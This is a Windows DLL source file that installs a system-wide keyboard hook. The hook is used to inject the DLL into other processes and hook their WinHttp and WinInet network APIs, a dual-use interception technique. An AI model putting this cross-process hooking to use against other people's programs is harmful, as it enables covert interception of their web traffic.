// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"


//begin
//#define _USE_WINHTTP_
//#define _USE_WININET_
#ifdef _USE_WINHTTP_
#include "WinHttpHook.h"
#elif defined(_USE_WININET_)
#include "WinInetHook.h"
#else
#include "WinHttpHook.h"
#include "WinInetHook.h"
#endif



#include <Windows.h>
#include <tchar.h>
#include <Imm.h>
#include <atlstr.h>
#pragma comment(lib, "Imm32.lib")
#include "InputMoniter.h"

#include "util.h"

HINSTANCE g_hInstance = NULL;
HHOOK g_hKbHook;
BOOL g_bWinHttpApiHook = FALSE;
BOOL g_bWinInetApiHook = FALSE;

///////////////////
// log
// void WriteAGLog(LPCSTR cstr)
// {
// 	char szFileFullPath[MAX_PATH*sizeof(char)];
// 	::GetModuleFileNameA(NULL, szFileFullPath, MAX_PATH*sizeof(char));
// 
// 	string s = szFileFullPath;
// 	int len = strlen(szFileFullPath);
// 	char *cfilename = strrchr(szFileFullPath, '\\');
// 	//char szFileName[128]='\0';
// 	//strcpy(szFileName, szFileFullPath+begin);
// 	char log[128];
// 	memset(log, 0, 128*sizeof(char));
// 	strcpy(log, cfilename+1);
// 	int loglen = strlen(log);
// 	memset(log+loglen-3, 'l', sizeof(char));
// 	memset(log+loglen-2, 'o', sizeof(char));
// 	memset(log+loglen-1, 'g', sizeof(char));
// 
// 	char prefix[MAX_PATH]; memset(prefix, 0, MAX_PATH);
// 	strcpy(prefix, "e:\\temp\\logs\\");
// 	char *logpath = strcat(prefix, log);
// 
// 	//
// 	struct tm *local;
// 	time_t t;
// 	t=time(NULL);
// 	local = localtime(&t);
// 	
// 	//
// 	FILE *fp = fopen(logpath, "a+");
// 	if (fp)
// 	{
// 		fprintf(fp, "%2d:%2d:%2d\t%s\n", local->tm_hour, local->tm_min, local->tm_sec, cstr);
// 		fclose(fp);
// 		fp = NULL;
// 	}
// 
// }
/////////////////////
LRESULT CALLBACK KbHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0)
	{
		return CallNextHookEx(g_hKbHook, nCode, wParam, lParam);
	}
	if (nCode != HC_ACTION)
	{
		return CallNextHookEx(g_hKbHook, nCode, wParam, lParam);
	}

// 	if (!::FindWindow(0, _T("KeyBoard Locked")))
// 	{
// 		::MessageBox(0, _T("键盘锁定！"), _T("KeyBoard Locked"), MB_OK);
// 	}
//	return 1;

#ifdef _USE_WINHTTP_
	if (g_bWinHttpApiHook == FALSE)
	{
		WriteAGLog("WinHttpInstallHooks");
		g_bWinHttpApiHook = WinHttpInstallHooks();
	}
#elif defined(_USE_WININET_)
	if (g_bWinInetApiHook==FALSE)
	{
		WriteAGLog("WinInetInstallHooks");
		g_bWinInetApiHook = WinInetInstallHooks();
	}
#else
	if (g_bWinHttpApiHook == FALSE)
	{
		WriteAGLog("WinHttpInstallHooks");
		g_bWinHttpApiHook = WinHttpInstallHooks();
	}
	if (g_bWinInetApiHook==FALSE)
	{
		WriteAGLog("WinInetInstallHooks");
		g_bWinInetApiHook = WinInetInstallHooks();
	}
#endif
	
	return CallNextHookEx(g_hKbHook, nCode, wParam, lParam);
}
BOOL EnableKeyboardCapture()
{
	WriteAGLog("EnableKeyboardCapture");
	if (!(g_hKbHook=SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KbHookProc, g_hInstance, 0)))
	{
		WriteAGLog("SetWindowsHookEx FALSE");
		return FALSE;
	}
	WriteAGLog("SetWindowsHookEx TRUE");
	return TRUE;
}
// 导出函数：解除键盘锁定
BOOL DisableKeyboardCapture()
{
	WriteAGLog("DisableKeyboardCapture");
#ifdef _USE_WINHTTP_
	WinHttpRemoveHooks();
#elif defined(_USE_WININET_)
	WinInetRemoveHooks();
#else
	WinHttpRemoveHooks();
	WinInetRemoveHooks();
#endif
	WriteAGLog("UnhookWindowsHookEx TRUE");
	return UnhookWindowsHookEx(g_hKbHook);
}
// end

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//EnableKeyboardCapture();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		//DisableKeyboardCapture();
		break;
	}
	g_hInstance = (HINSTANCE)hModule;
	return TRUE;
}


